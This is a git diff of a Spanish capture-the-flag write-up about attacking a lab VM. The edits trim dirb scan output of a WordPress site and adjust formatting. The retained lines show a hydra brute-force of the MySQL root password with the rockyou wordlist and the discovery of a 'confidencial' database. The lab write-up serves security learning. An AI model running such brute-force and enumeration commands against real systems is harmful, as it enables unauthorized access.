@@ -183,80 +183,7 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/                                                                                                                                                                                                                                                                       
 ==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/                                                                                                                                                                                                                                                                     
 ==> DIRECTORY: http://10.0.2.15/wordpress/wp-includes/                                                                                                                                                                                                                                                                    
-+ http://10.0.2.15/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                                                                                                                                                                                                                
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-admin/ ----
-+ http://10.0.2.15/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                         
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/css/                                                                                                                                                                                                                                                                   
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/images/                                                                                                                                                                                                                                                                
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/includes/                                                                                                                                                                                                                                                              
-+ http://10.0.2.15/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                         
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/js/                                                                                                                                                                                                                                                                    
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/maint/                                                                                                                                                                                                                                                                 
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/network/                                                                                                                                                                                                                                                               
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/user/                                                                                                                                                                                                                                                                  
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-content/ ----
-+ http://10.0.2.15/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                                                                                                                                                                                                                       
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/languages/                                                                                                                                                                                                                                                           
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/plugins/                                                                                                                                                                                                                                                             
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/themes/                                                                                                                                                                                                                                                              
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/upgrade/                                                                                                                                                                                                                                                             
-==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/uploads/                                                                                                                                                                                                                                                             
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-includes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-admin/css/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-admin/images/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-admin/includes/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-admin/js/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-admin/maint/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-admin/network/ ----
-+ http://10.0.2.15/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                 
-+ http://10.0.2.15/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                 
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-admin/user/ ----
-+ http://10.0.2.15/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                    
-+ http://10.0.2.15/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                    
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-content/languages/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-content/plugins/ ----
-+ http://10.0.2.15/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                                                                                                                                                                                                               
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-content/themes/ ----
-+ http://10.0.2.15/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                                                                                                                                                                                                                                
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-content/upgrade/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                                                                                                                                                                                          
----- Entering directory: http://10.0.2.15/wordpress/wp-content/uploads/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                               
------------------
-END_TIME: Mon Jul 15 13:50:35 2024
-DOWNLOADED: 36896 - FOUND: 13
++ http://10.0.2.15/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                                                                                                                                                                         
 ```
 
 Ya tenemos por donde empezar.
@@ -267,7 +194,7 @@ Ya tenemos por donde empezar.
 
 Paramos aquí.... viene un consejo.
 
-Lo he dicho en otros posts, no tenemos que ir a lo loco, pero sí "por faena". Mientras se está realizando un escaneo, como el anterior de `dirb`, podemos ir realizando pruebas. Teníamos los puertos 22 y 3306 abiertos. Lanzamos un `hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.0.2.15`, y mientras documento el `dirb` anterior, me encuentro una sorpresa:
+Lo he dicho en otros posts, no tenemos que ir a lo loco, pero sí **"por faena"**. Mientras se está realizando un escaneo, como el anterior de `dirb`, podemos ir realizando pruebas. Teníamos los puertos 22 y 3306 abiertos. Lanzamos un `hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.0.2.15`, y mientras documento el `dirb` anterior, me encuentro una sorpresa:
 
 ```shell
 ❯ hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.0.2.15
@@ -410,6 +337,7 @@ Tenemos un hash y un token. Pero hemos entrado en un `rabbit hole`. Es important
 
 
 
+```sql
 MariaDB [(none)]> show databases;
 +--------------------+
 | Database           |
@@ -422,10 +350,11 @@ MariaDB [(none)]> show databases;
 | wordpress          |
 +--------------------+
 6 rows in set (0.002 sec)
+```
 
 ### Descubrimiento de la base de datos "confidencial"
 
-Por favor..... ¿cómo no hemos visto la primera? Casi nos da un guantazo en toda la cara, diciéndonos algo...
+Por favor..... ¿cómo no hemos visto la primera? Casi nos da un guantazo en toda la cara ... `CONFIDENCIAL`
 
 ```sql
 MariaDB [(none)]> use confidencial;
@@ -474,13 +403,6 @@ mortadela@mortadela:~$
 ### Reflexión: El aprendizaje en cada paso
 
 Antes tuvimos suerte encontrando con Hydra la password root, mientras analizábamos Wordpress. Evitamos una pérdida de tiempo muy grande, pero, el no ver la tabla `confidencial` nos ha hecho caer en otro agujero. Es lo maravilloso de este mundo **:)**
-
----
-
-Continuaremos explorando desde aquí para descubrir qué más podemos encontrar en el sistema.
-
-
-
 
 ### Búsqueda de privilegios
 
